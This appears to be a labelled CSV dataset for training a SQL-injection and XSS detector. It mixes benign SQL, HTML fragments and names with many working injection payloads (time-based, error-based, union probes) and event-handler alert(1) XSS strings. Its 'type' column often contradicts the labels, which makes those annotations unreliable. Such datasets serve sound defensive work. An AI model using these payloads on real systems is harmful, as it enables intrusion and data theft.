Text,Label,type
"1""  )   where 1614  =  1614 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,sql
"<tfoot onbeforepaste=""alert(1)"" contenteditable>test</tfoot>",2,xss
al9ol,0,xss
SELECT doubt ( s ) FROM copy INNER JOIN,0,xss
"<li><a href=""/wiki/Philosophical_zombie"" title=""Philosophical zombie"">Zombie </a> </li>",0,xss
 UPDATE basic SET proper = 'bag'WHERE high = 'did',0,sql
1 rlike sleep  (  5  )  # urxh,1,sql
machar,0,sql
santibez el bajo,0,sql
"<noframes onclick=""alert(1)"">test</noframes>",2,xss
SELECT * FROM practical  WHERE front NOT LIKE '[exact]%',0,sql
"<li><a href=""/wiki/Information_retrieval"" title=""Information retrieval"">Information retrieval </a> </li> </ul>",0,xss
SELECT * FROM pile WHERE idea NOT LIKE 'most%',0,sql
corota,0,sql
"   SELECT COUNT ( fought ) , sweet FROM factor BY stage",0,sql
"<canvas draggable=""true"" ondragend=""alert(1)"">test</canvas>",2,xss
<svg><li onload=alert(1)></li>,2,xss
"1""   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
SELECT * FROM forty WHERE across  BETWEEN 10 AND 20,0,sql
SELECT * FROM news WHERE where  BETWEEN 10 AND 20,0,sql
keely4,0,sql
SELECT least ( s ) FROM again INNER JOIN,0,sql
24768,0,sql
9.45491E+14,0,sql
29716,0,sql
"<li class=""toclevel-3 tocsection-22""><a href=""#Embodied_intelligence""><span class=""tocnumber"">5.3.1 ",0,xss
"1 where 6040  =  6040 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
nooshin,0,sql
"  SELECT TIME_TO_SEC ( ""19:30:10"" ) ;",0,xss
<hr id=x tabindex=1 onbeforedeactivate=alert(1)></hr><input autofocus>,2,xss
"<style>@keyframes x{}</style><font style=""animation-name:x"" onanimationend=""alert(1)""></font>",2,xss
-8397'   )    )     )   or 2171  =  4788,1,sql
" SELECT * FROM traffic ORDER BY help ASC, essential DESC",0,sql
26064480y,0,sql
"<dialog oncut=""alert(1)"" contenteditable>test</dialog>",2,xss
"1  )   where 6340  =  6340 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,sql
"1%""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""%""  =  """,1,sql
6a0ato,0,sql
"1' in boolean mode  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
SELECT * FROM prepare WHERE two = 'paper' FETCH FIRST 3 ROWS ONLY,0,xss
"-8790'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'nsze' like 'nsze",1,sql
<samp id=x tabindex=1 onfocus=alert(1)></samp>,2,xss
SELECT * FROM each FETCH FIRST 3 ROWS ONLY,0,sql
"  SELECT * FROM harbor WHERE butter IN  ( 'correct', 'gain', 'load' )  ",0,sql
"	 </span> <span class=""toctext"">Law-related professions ",0,xss
<nextid onpointermove=alert(1)>XSS</nextid>,2,xss
"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'cdgm' like 'cdgm",1,sql
"SELECT LPAD ( ""SQL Tutorial"",   20, ""ABC"" ) ;",0,sql
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  ',1,sql
nichol,0,sql
"<div draggable=""true"" contenteditable>drag me</div><a ondragover=alert(1) contenteditable>drop here</a>",2,xss
<slot onpointermove=alert(1)>XSS</slot>,2,xss
SELECT MIN ( taste )  AS involved FROM eight,0,sql
1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #,1,sql
SELECT * FROM me WHERE affect = 'percent',0,sql
SELECT AVG ( rain ) FROM slipped,0,sql
6.12137E+15,0,sql
4.55062E+15,0,xss
SELECT TOP 50 PERCENT * FROM sort SELECT * FROM wind FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM chief,0,xss
SELECT * FROM cool WHERE ready = 'eye'  OR regular = 'alive',0,sql
<element id=x tabindex=1 onfocusin=alert(1)></element>,2,xss
SELECT TOP 50 PERCENT * FROM anything,0,sql
"<style>@keyframes x{}</style><bdi style=""animation-name:x"" onanimationend=""alert(1)""></bdi>",2,xss
 </li>,0,xss
<map onfocusout=alert(1) tabindex=1 id=x></map><input autofocus>,2,xss
"calle santa corda, 84, 3?h",0,sql
"1%'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  '%'  =  '",1,sql
"  SELECT Orders.richrID, Employees.breeze, Employees.slipped FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.spellID ORDER BY Orders.planeID",0,sql
9.37032E+15,0,sql
"<rp onmousemove=""alert(1)"">test</rp>",2,xss
" SELECT column_name ( s )  FROM drink,bank",0,sql
"altos de lillo, 137",0,xss
"1"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""uvvy"" like ""uvvy",1,sql
-6015%'  )   order by 1--,1,sql
"1'||  (  select 'bvic' from dual where 4839  =  4839 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   ||'",1,sql
SELECT * FROM mix,0,sql
<nobr onpointerover=alert(1)>XSS</nobr>,2,xss
  )  ;waitfor delay '0:0:__TIME__'--,1,sql
<small id=x tabindex=1 onbeforeactivate=alert(1)></small>,2,xss
SELECT poor FROM battle UNION SELECT piano FROM got ORDER BY principal,0,sql
<slot onpointerleave=alert(1)>XSS</slot>,2,xss
"<legend onmouseenter=""alert(1)"">test</legend>",2,xss
"1""  )   as yekp where 3049  =  3049 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,xss
SELECT * FROM purpose 3,0,xss
43785,0,sql
SELECT any ( s )  FROM close UNION ALL,0,sql
shorwan,0,sql
"Researchers in the 1960s and the 1970s were convinced that symbolic approaches would eventually succeed in creating a machine with <a href=""/wiki/Artificial_general_intelligence"" title=""Artificial general intelligence"">artificial general intelligence </a> and considered this the goal of their field.",0,xss
SELECT * FROM essential,0,sql
"<style>:target {color: red;}</style><dd id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dd>",2,xss
alvaro-pagano@hiperpapel.an,0,xss
SELECT out ( s )  FROM afternoon,0,xss
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'atyf'  =  'atyf",1,sql
SELECT * FROM cake 3,0,sql
1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,1,sql
"  SELECT topicID AS ID, pipe AS went FROM kitchen",0,sql
elbeze,0,sql
<svg><dt onload=alert(1)></dt>,2,xss
bowman pinela,0,sql
SELECT * FROM claws  WHERE boy NOT LIKE '[thus]%',0,sql
"<wbr draggable=""true"" ondragend=""alert(1)"">test</wbr>",2,xss
roboracin,0,xss
SELECT * FROM cow 3 SELECT * FROM high,0,sql
"1%""   )    )    and 9198  =  9198--",1,sql
<animatemotion onpointerleave=alert(1)>XSS</animatemotion>,2,xss
SELECT * FROM object,0,sql
1'  )   where 9175  =  9175,1,xss
	 </span> </a> </li>,0,xss
"-7126'   )    )    as fzpp where 8078  =  8078 union all select 8078,8078,8078,8078,8078,8078,8078#",1,sql
	 </span> </li>,0,xss
	 </span></a></dt><dd>Output your scraped data using different formats and storages.</dd>,0,xss
"1   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1,sql
SELECT * FROM cast WHERE aside BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"	 </span> <span class=""toctext"">Cybersecurity ",0,xss
"<li><a href=""/wiki/Buckminster_Fuller"" title=""Buckminster Fuller"">Buckminster Fuller </a> </li>",0,xss
SELECT MIN ( anywhere )  AS huge FROM in,0,sql
SELECT * FROM smallest FETCH FIRST 50 PERCENT ROWS ONLY,0,xss
pifiar,0,sql
58439631n,0,sql
"<li><a href=""/wiki/Process_control"" title=""Process control"">Process control system </a> </li>",0,xss
"  SELECT are AS face, stretch AS [steel]  FROM too",0,sql
SELECT TOP 3 * FROM song WHERE shout = 'young',0,sql
"<col draggable=""true"" ondragend=""alert(1)"">test</col>",2,xss
<kbd onpointerover=alert(1)>XSS</kbd>,2,xss
"-5148""   )    )    or 5310  =  8229",1,sql
1'+  (  select 'ozpm' where 6939  =  6939 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  +',1,sql
"<pre draggable=""true"" ondragleave=""alert(1)"">test</pre>",2,xss
 </ul>,0,xss
SELECT * FROM though WHERE camera NOT LIKE '[spirit]%',0,xss
"<style>@keyframes slidein {}</style><isindex style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></isindex>",2,xss
62616848s,0,xss
"waitfor delay '0:0:5' and   (  ""%""  =  """,1,sql
"1"" and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
"<li id=""cite_note-Uninformed_search-188""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Uninformed_search_188-0"">^ </a> </b> ",0,xss
"<select oncontextmenu=""alert(1)"">test</select>",2,xss
"INSERT INTO large ( paid, ride, clothes, success, minute, porch )  VALUES  ( 'word', 'had'. nose', 'cold', 'way', 'pencil', 'coat' )  ",0,sql
"paseo alameda de osuna 10,",0,sql
"<noembed onbeforepaste=""alert(1)"" contenteditable>test</noembed>",2,xss
 )   or pg_sleep  (  __TIME__  )  --,1,sql
SELECT AVG ( late ) FROM vote,0,xss
"<select onkeyup=""alert(1)"" contenteditable>test</select>",2,xss
maestro vitoria 10,0,xss
 </li>,0,xss
"	 </span> <span class=""reference-text""><cite class=""citation magazine"">Schank, Roger C. (1991). ""Where's the AI"". <i>AI magazine </i>. Vol.&#160;12 no.&#160;4. p.&#160;38. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=AI+magazine&amp;rft.atitle=Where%27s+the+AI&amp;rft.volume=12&amp;rft.issue=4&amp;rft.pages=38&amp;rft.date=1991&amp;rft.aulast=Schank&amp;rft.aufirst=Roger+C.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
linton,0,xss
"1%' and elt  (  4249  =  4249,7259  )   and '%'  =  '",1,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/contracts.html"">Spiders Contracts</a></li>",0,xss
SELECT option_value FROM wp_options WHERE option_name  =  'can_compress_scripts' LIMIT 1,0,sql
1'||  (  select 'tisi' from dual where 1616  =  1616 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ||',1,sql
<div id=x tabindex=1 onbeforeactivate=alert(1)></div>,2,xss
"1  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1,xss
"<head onmouseover=""alert(1)"">test</head>",2,xss
"-9156'   )    )    union all select 9110,9110,9110,9110#",1,sql
"  SELECT safetyID AS ID, row AS me FROM action",0,xss
"1"" where 9901  =  9901 and   (  2455  =  8499  )  *8499--",1,sql
"<strike onbeforecopy=""alert(1)"" contenteditable>test</strike>",2,xss
1%'  ) ,1,xss
"1  )   where 9724  =  9724 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
39500,0,sql
"<base onmouseout=""alert(1)"">test</base>",2,xss
SELECT TOP 50 PERCENT * FROM definition SELECT * FROM practice FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM cook,0,xss
"-7139""  )   where 2723  =  2723 or 3900  =  5082--",1,sql
	 </span></a></dt><dd>Tune Scrapy for crawling a lot domains in parallel.</dd>,0,xss
-5585' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1,sql
raian,0,xss
"1,updatexml  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  2917  =  2917,1   )    )     )  ,0x717a767a71  )  ,8295  )  ",1,sql
SELECT COUNT ( stateID ) FROM account,0,sql
<tbody onblur=alert(1) tabindex=1 id=x></tbody><input autofocus>,2,xss
schouwen,0,sql
"          <dd><a href=""/en/2.0/"">2.0</a></dd>",0,xss
"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",1,sql
"1%""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""%""  =  """,1,xss
SELECT * FROM breeze FETCH FIRST 3 ROWS ONLY,0,sql
galindo beneyto,0,xss
1%'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,xss
inamulla,0,sql
"<li><a href=""/wiki/Model-dependent_realism"" title=""Model-dependent realism"">Model-dependent realism </a> </li>",0,xss
"<param oncontextmenu=""alert(1)"">test</param>",2,xss
"   SELECT behavior, birds+ ', ' + uncle+ ' ' + create+ ', ' + myself AS home  FROM forgot",0,xss
-4979'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'ofgg'  =  'ofgg,1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
SELECT review FROM told UNION SELECT sand FROM studying ORDER BY single,0,sql
SELECT * FROM cannot FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM itself,0,sql
SELECT MIN ( of )  AS religious FROM hat,0,sql
"1  )   as jvuo where 6859  =  6859 union all select null,null,null,null,null,null,null#",1,sql
 </div>,0,xss
SELECT AVG ( system ) FROM fix SELECT SUM ( dull ) ,0,sql
"1""   )    )    as rhea where 2982  =  2982 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",1,sql
<body onpointerout=alert(1)>XSS</body>,2,xss
"<u draggable=""true"" ondrag=""alert(1)"">test</u>",2,xss
SELECT AVG ( motion ) FROM were,0,sql
"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""dyoe""  =  ""dyoe",1,sql
<dl id=x tabindex=1 ondeactivate=alert(1)></dl><input id=y autofocus>,2,xss
	 </span></a></dt><dd>Understand Scrapy versioning and API stability.</dd>,0,xss
SELECT dirt ( s )  FROM safe,0,sql
"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,sql
"<label draggable=""true"" ondragstart=""alert(1)"">test</label>",2,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/debug.html"">Debugging Spiders</a></li>",0,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367848 )  ORDER BY meta_id ASC",0,sql
SELECT material ( s )  FROM port SELECT automobile FROM almost,0,sql
"  SELECT * FROM class WHERE add IN  ( 'swimming', 'stairs', 'consider' )  ",0,xss
"-1339   )    )     )   union all select 2938,2938,2938,2938,2938,2938#",1,sql
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
SELECT AVG ( him ) FROM five SELECT SUM ( clearly ) ,0,sql
"<h2><span class=""mw-headline"" id=""See_also"">See also ",0,xss
DELETE FROM prize,0,sql
select   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sql
"<fieldset onmousedown=""alert(1)"">test</fieldset>",2,xss
SELECT AVG ( song ) FROM brown SELECT SUM ( better ) ,0,sql
<u onpointerdown=alert(1)>XSS</u>,2,xss
1'+  (  select yjtm where 3965  =  3965 and 9389  =  3443,1,sql
"<p><a href=""/wiki/Financial_institution"" title=""Financial institution"">Financial institutions </a> have long used <a href=""/wiki/Artificial_neural_network"" title=""Artificial neural network"">artificial neural network </a> systems to detect charges or claims outside of the norm, flagging these for human investigation. The use of AI in <a href=""/wiki/Banking"" class=""mw-redirect"" title=""Banking"">banking </a> can be traced back to 1987 when <a href=""/wiki/Security_Pacific_National_Bank"" class=""mw-redirect"" title=""Security Pacific National Bank"">Security Pacific National Bank </a> in US set-up a Fraud Prevention Task force to counter the unauthorized use of debit cards.<sup id=""cite_ref-314"" class=""reference""><a href=""#cite_note-314"">&#91;303&#93; </a> </sup> Programs like Kasisto and Moneystream are using AI in financial services.",0,xss
SELECT TOP 50 PERCENT * FROM pretty SELECT * FROM football FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM airplane,0,sql
SELECT TOP 50 PERCENT * FROM area SELECT * FROM wise FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM throat,0,sql
SELECT COUNT ( own ) FROM breeze,0,sql
jodie,0,sql
"1' in boolean mode  )   union all select null,null,null,null,null,null#",1,sql
"1'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'sucj'  =  'sucj",1,sql
SELECT expect ( s )  FROM slight SELECT satisfied FROM phrase,0,sql
SELECT drove,0,sql
daniza,0,xss
drohocka@baybay.mq,0,sql
SELECT * FROM garden,0,xss
c/ cofa 39,0,sql
"<li id=""cite_note-224""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-224"">^ </a> </b> ",0,xss
sagaceta farell,0,sql
"1"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""ouix""  =  ""ouix",1,sql
"<xmp draggable=""true"" ondrag=""alert(1)"">test</xmp>",2,xss
"<ul><li><a href=""/wiki/Behaviorism"" title=""Behaviorism"">Behaviorism </a> (<a href=""/wiki/Radical_behaviorism"" title=""Radical behaviorism"">Radical </a>) </li>",0,xss
SELECT * FROM art WHERE grabbed BETWEEN '1996-07-01' AND '1996-07-31',0,xss
02877417w,0,sql
"1"" where 1852  =  1852 union all select null,null,null,null,null,null,null,null,null#",1,xss
"<div draggable=""true"" contenteditable>drag me</div><b ondrop=alert(1) contenteditable>drop here</b>",2,xss
SELECT TOP 50 PERCENT * FROM furniture SELECT * FROM change FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM then,0,xss
SELECT kill ( s )  FROM lamp SELECT am FROM lay,0,sql
SELECT * FROM headed,0,sql
SELECT * FROM finally WHERE than LIKE '%describe%',0,sql
-3598  )   union all select 2264#,1,sql
<dt onpointermove=alert(1)>XSS</dt>,2,xss
"  <div role=""contentinfo"">",0,xss
"   SELECT road, favorite, badFROM victory WHERE cause  IS NOT NULL",0,sql
<base id=x tabindex=1 ondeactivate=alert(1)></base><input id=y autofocus>,2,xss
"-1254"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ",1,sql
signoret@pisossantcugat.cat,0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
	<h3 >,0,xss
1' or '1'  =  '1,1,xss
eggebraa,0,sql
"<ul><li><a href=""/wiki/Audio-Animatronics"" title=""Audio-Animatronics"">Audio-Animatronics </a> </li> </ul> </li>",0,xss
nardo,0,sql
"<mark draggable=""true"" ondrag=""alert(1)"">test</mark>",2,xss
"1"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""aixs""  =  ""aixs",1,sql
SELECT * FROM chamber WHERE discovery = 'short' LIMIT 3,0,sql
"<table onclick=""alert(1)"">test</table>",2,xss
	 </span>,0,xss
-1662 where 1119  =  1119 or   (  8459  =  8459  )  *4906--,1,sql
SELECT * FROM hope WHERE seven = 'solid' FETCH FIRST 3 ROWS ONLY,0,xss
"  SELECT WEEK ( ""2017-06-15"" ) ;",0,sql
<animate onpointermove=alert(1)>XSS</animate>,2,xss
SELECT * FROM troops WHERE equal NOT LIKE '[bright]%',0,sql
SELECT * FROM  ( SELECT slide FROM shout ) ,0,sql
"<isindex oncut=""alert(1)"" contenteditable>test</isindex>",2,xss
herminia,0,sql
<param onpointerdown=alert(1)>XSS</param>,2,xss
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""qkat""  =  ""qkat",1,sql
	 </span> </li>,0,xss
"-4385%'   )    )    union all select 6694,6694,6694,6694,6694,6694,6694,6694,6694,6694#",1,sql
SELECT * FROM look FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
<svg><image href=1 onerror=alert(1)>,2,xss
SELECT * FROM drink WHERE deeply LIKE '%metal%',0,sql
6.36091E+15,0,sql
"<li id=""cite_note-Golden_years_of_AI-37""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Golden_years_of_AI_37-0"">^ </a> </b> ",0,xss
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5fbce94a85edc' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,xss
ma$c3donio,0,sql
"  SELECT PERIOD_DIFF ( 1703, 1612 ) ;",0,sql
SELECT * FROM lunch  WHERE him = joy,0,sql
"-7485%'   )    )     )   union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--",1,sql
SELECT * FROM crew  WHERE put = problem,0,sql
SELECT gave ( s )  FROM sum SELECT meant ( s ) ,0,sql
"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'uorw' like 'uorw",1,sql
"   SELECT Employees.LastName, COUNT ( Orders.OrderID )  AS NumberOfOrdersFROM Orders  INNER JOIN Employees ON Orders.EmployeeID  =  Employees.EmployeeID",0,sql
SELECT TOP 3 * FROM particular WHERE except = 'ranch' SELECT * FROM double,0,sql
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367658 ) ,0,sql
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationend=""alert(1)""></textarea>",2,xss
select   (  case when   (  1868  =  5071  )   then 1 else 1868*  (  select 1868 from master..sysdatabases  )   end  )  --,1,sql
"-5207  )   where 6987  =  6987 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,sql
"	 </span> <span class=""reference-text""><cite class=""citation web""> <a rel=""nofollow"" class=""external text"" href=""https://ars.electronica.art/outofthebox/en/digital-humanism-conf/"">Retrieved September 2019 https://ars.electronica.art/outofthebox/en/digital-humanism-conf/ Retrieved September 2019 </a><span class=""cs1-visible-error error citation-comment""> Check <code class=""cs1-code"">&#124;url= </code> value (<a href=""/wiki/Help:CS1_errors#bad_url"" title=""Help:CS1 errors"">help </a>) ",0,xss
"<bdi onbeforecut=""alert(1)"" contenteditable>test</bdi>",2,xss
"	 <div style=""padding:0em 0.25em"">",0,xss
" SELECT * FROM change ORDER BY labor ASC, especially DESC",0,xss
"1""   )    )    and 9800  =  8713",1,sql
"<div draggable=""true"" contenteditable>drag me</div><q ondragover=alert(1) contenteditable>drop here</q>",2,xss
SELECT * FROM glass FETCH FIRST 3 ROWS ONLY,0,sql
<image3 onpointerout=alert(1)>XSS</image3>,2,xss
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",1,xss
batido,0,sql
	 </span></a></dt><dd>Learn how to contribute to the Scrapy project.</dd>,0,xss
SELECT * FROM capital WHERE grabbed = 'fighting' LIMIT 3,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://hackernoon.com/how-ai-is-getting-groundbreaking-changes-in-talent-management-and-hr-tech-d24ty3zzd"">""How AI Is Getting Groundbreaking Changes In Talent Management And HR Tech"" </a>. Hackernoon. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=How+AI+Is+Getting+Groundbreaking+Changes+In+Talent+Management+And+HR+Tech&amp;rft.pub=Hackernoon&amp;rft_id=https%3A%2F%2Fhackernoon.com%2Fhow-ai-is-getting-groundbreaking-changes-in-talent-management-and-hr-tech-d24ty3zzd&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT * FROM passage  WHERE by NOT LIKE '[laid]%',0,sql
"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,sql
rolando,0,xss
"<time oncut=""alert(1)"" contenteditable>test</time>",2,xss
buschoff_fortuna@rudos.zr,0,sql
<input onpointerdown=alert(1)>XSS</input>,2,xss
select sleep  (  5  )   and    (    (     (  8354  =  8354,1,xss
SELECT COUNT ( comfortableID ) FROM tree,0,sql
descostill3r,0,sql
